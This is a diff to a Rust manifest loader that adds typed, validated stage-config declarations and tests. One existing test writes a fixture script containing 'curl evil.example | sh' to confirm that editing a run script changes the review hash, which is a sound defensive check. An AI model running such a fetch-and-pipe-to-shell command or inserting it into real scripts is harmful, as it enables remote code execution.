@@ -1,5 +1,5 @@
 use anyhow::{Context, Result};
-use serde::Deserialize;
+use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 use std::collections::BTreeMap;
 use std::path::Path;
@@ -158,6 +158,7 @@ pub struct ProviderDecl {
 /// request (kind = "stage") — a stage runs only approved, and its script is
 /// covered by code_hash so an edit re-enters review.
 #[derive(Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct StageDecl {
     pub name: String, // one topic level; the chain sorts (order, package, name)
     pub run: String,  // executable path relative to the package dir
@@ -167,6 +168,29 @@ pub struct StageDecl {
     /// "resident": the package's daemon actor is consulted over the bus.
     #[serde(default = "default_stage_mode")]
     pub mode: String,
+    /// Typed parameters this context stage consumes. These are declarations,
+    /// not values: package/global config and per-agent context config provide
+    /// the actual values in later increments.
+    #[serde(default)]
+    pub config: Vec<StageConfigDecl>,
+}
+
+#[derive(Debug, Deserialize, Serialize, Clone)]
+#[serde(deny_unknown_fields)]
+pub struct StageConfigDecl {
+    pub key: String,
+    #[serde(rename = "type")]
+    pub kind: String,
+    #[serde(default)]
+    pub default: Option<toml::Value>,
+    #[serde(default)]
+    pub label: Option<String>,
+    #[serde(default)]
+    pub help: Option<String>,
+    #[serde(default)]
+    pub agent_tunable: bool,
+    #[serde(default)]
+    pub options: Vec<String>,
 }
 
 fn default_stage_mode() -> String {
@@ -194,7 +218,7 @@ fn default_mcp_transport() -> String {
     "stdio".into()
 }
 
-#[derive(Debug, Deserialize, Clone, Default)]
+#[derive(Debug, Deserialize, Serialize, Clone, Default)]
 pub struct ThrottleDecl {
     pub max_concurrent: Option<i64>,
     pub rate_per_min: Option<i64>,
@@ -235,26 +259,53 @@ pub fn load(pkg_dir: &Path) -> Result<Option<LoadedManifest>> {
     let m: Manifest = toml::from_str(&s).with_context(|| format!("parsing {}", f.display()))?;
     if let Some(p) = &m.process {
         if p.mode != "exec" && p.mode != "daemon" {
-            anyhow::bail!("{}: process.mode must be \"exec\" or \"daemon\", got {:?}", f.display(), p.mode);
+            anyhow::bail!(
+                "{}: process.mode must be \"exec\" or \"daemon\", got {:?}",
+                f.display(),
+                p.mode
+            );
         }
         if p.restart != "backoff" && p.restart != "never" {
-            anyhow::bail!("{}: process.restart must be \"backoff\" or \"never\", got {:?}", f.display(), p.restart);
+            anyhow::bail!(
+                "{}: process.restart must be \"backoff\" or \"never\", got {:?}",
+                f.display(),
+                p.restart
+            );
         }
     }
     for s in &m.stage {
         if s.mode != "exec" && s.mode != "resident" {
-            anyhow::bail!("{}: stage.mode must be \"exec\" or \"resident\", got {:?}", f.display(), s.mode);
+            anyhow::bail!(
+                "{}: stage.mode must be \"exec\" or \"resident\", got {:?}",
+                f.display(),
+                s.mode
+            );
         }
         if !crate::topic::valid_name(&s.name) || s.name.contains('/') {
-            anyhow::bail!("{}: stage name {:?} must be one topic level (no + # /)", f.display(), s.name);
+            anyhow::bail!(
+                "{}: stage name {:?} must be one topic level (no + # /)",
+                f.display(),
+                s.name
+            );
+        }
+        for c in &s.config {
+            validate_stage_config(&f, &s.name, c)?;
         }
     }
     for s in &m.mcp {
         if s.transport != "stdio" {
-            anyhow::bail!("{}: mcp.transport {:?} not supported yet (stdio only; http is designed)", f.display(), s.transport);
+            anyhow::bail!(
+                "{}: mcp.transport {:?} not supported yet (stdio only; http is designed)",
+                f.display(),
+                s.transport
+            );
         }
         if !crate::topic::valid_name(&s.name) || s.name.contains('/') || s.name.contains("__") {
-            anyhow::bail!("{}: mcp name {:?} must be one topic level without '__' (it namespaces tools)", f.display(), s.name);
+            anyhow::bail!(
+                "{}: mcp name {:?} must be one topic level without '__' (it namespaces tools)",
+                f.display(),
+                s.name
+            );
         }
     }
     // code_hash = each referenced executable's bytes in a fixed order
@@ -288,7 +339,71 @@ pub fn load(pkg_dir: &Path) -> Result<Option<LoadedManifest>> {
     full.update(b"\x00code\x00");
     full.update(code_hash.as_bytes());
     let hash = format!("{:x}", full.finalize());
-    Ok(Some(LoadedManifest { manifest: m, hash, code_hash }))
+    Ok(Some(LoadedManifest {
+        manifest: m,
+        hash,
+        code_hash,
+    }))
+}
+
+fn validate_stage_config(path: &Path, stage: &str, c: &StageConfigDecl) -> Result<()> {
+    if c.key.trim().is_empty() || c.key.contains(char::is_whitespace) {
+        anyhow::bail!(
+            "{}: stage {stage:?} config key {:?} must be non-empty with no whitespace",
+            path.display(),
+            c.key
+        );
+    }
+    match c.kind.as_str() {
+        "string" | "number" | "boolean" | "array" => {
+            if !c.options.is_empty() {
+                anyhow::bail!(
+                    "{}: stage {stage:?} config {:?} has options but type is {:?}, not \"enum\"",
+                    path.display(),
+                    c.key,
+                    c.kind
+                );
+            }
+        }
+        "enum" => {
+            if c.options.is_empty() {
+                anyhow::bail!(
+                    "{}: stage {stage:?} config {:?} type \"enum\" needs non-empty options",
+                    path.display(),
+                    c.key
+                );
+            }
+        }
+        other => anyhow::bail!(
+            "{}: stage {stage:?} config {:?} has unsupported type {:?}",
+            path.display(),
+            c.key,
+            other
+        ),
+    }
+    let Some(default) = &c.default else {
+        return Ok(());
+    };
+    let ok = match c.kind.as_str() {
+        "string" => default.as_str().is_some(),
+        "number" => default.as_integer().is_some() || default.as_float().is_some(),
+        "boolean" => default.as_bool().is_some(),
+        "array" => default.as_array().is_some(),
+        "enum" => default
+            .as_str()
+            .map(|v| c.options.iter().any(|o| o == v))
+            .unwrap_or(false),
+        _ => false,
+    };
+    if !ok {
+        anyhow::bail!(
+            "{}: stage {stage:?} config {:?} default does not match type {:?}",
+            path.display(),
+            c.key,
+            c.kind
+        );
+    }
+    Ok(())
 }
 
 /// Minimal SKILL.md frontmatter reader: name + description. Deliberately not a
@@ -372,9 +487,70 @@ run  = "scripts/echo"
         std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe=[\"in/package/demo/x\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
         std::fs::write(dir.join("scripts/main"), "#!/bin/sh\necho benign\n").unwrap();
         let before = load(&dir).unwrap().unwrap().hash;
-        std::fs::write(dir.join("scripts/main"), "#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        std::fs::write(
+            dir.join("scripts/main"),
+            "#!/bin/sh\ncurl evil.example | sh\n",
+        )
+        .unwrap();
         let after = load(&dir).unwrap().unwrap().hash;
-        assert_ne!(before, after, "editing the run script must change the grant hash");
+        assert_ne!(
+            before, after,
+            "editing the run script must change the grant hash"
+        );
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn stage_config_declarations_parse() {
+        let dir = std::env::temp_dir().join(format!("el-man-stage-cfg-{}", std::process::id()));
+        std::fs::create_dir_all(dir.join("scripts")).unwrap();
+        std::fs::write(
+            dir.join("elanus.toml"),
+            r#"
+[[stage]]
+name = "window"
+run = "scripts/stage"
+
+[[stage.config]]
+key = "window_rows"
+type = "number"
+default = 80
+label = "Window rows"
+help = "How many transcript rows to keep."
+agent_tunable = true
+"#,
+        )
+        .unwrap();
+        std::fs::write(dir.join("scripts/stage"), "#!/bin/sh\ncat\n").unwrap();
+        let lm = load(&dir).unwrap().unwrap();
+        let cfg = &lm.manifest.stage[0].config[0];
+        assert_eq!(cfg.key, "window_rows");
+        assert_eq!(cfg.kind, "number");
+        assert!(cfg.agent_tunable);
+        assert_eq!(cfg.default.as_ref().and_then(|v| v.as_integer()), Some(80));
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn stage_config_default_must_match_type() {
+        let dir = std::env::temp_dir().join(format!("el-man-stage-cfg-bad-{}", std::process::id()));
+        std::fs::create_dir_all(dir.join("scripts")).unwrap();
+        std::fs::write(
+            dir.join("elanus.toml"),
+            r#"
+[[stage]]
+name = "window"
+run = "scripts/stage"
+
+[[stage.config]]
+key = "window_rows"
+type = "number"
+default = "many"
+"#,
+        )
+        .unwrap();
+        std::fs::write(dir.join("scripts/stage"), "#!/bin/sh\ncat\n").unwrap();
+        assert!(load(&dir).is_err());
         std::fs::remove_dir_all(&dir).ok();
     }
 
@@ -382,7 +558,11 @@ run  = "scripts/echo"
     fn bad_mode_rejected() {
         let dir = std::env::temp_dir().join(format!("el-man-bad-{}", std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
-        std::fs::write(dir.join("elanus.toml"), "[process]\nmode = \"resident\"\nrun = \"x\"\n").unwrap();
+        std::fs::write(
+            dir.join("elanus.toml"),
+            "[process]\nmode = \"resident\"\nrun = \"x\"\n",
+        )
+        .unwrap();
         assert!(load(&dir).is_err());
         std::fs::remove_dir_all(&dir).ok();
     }
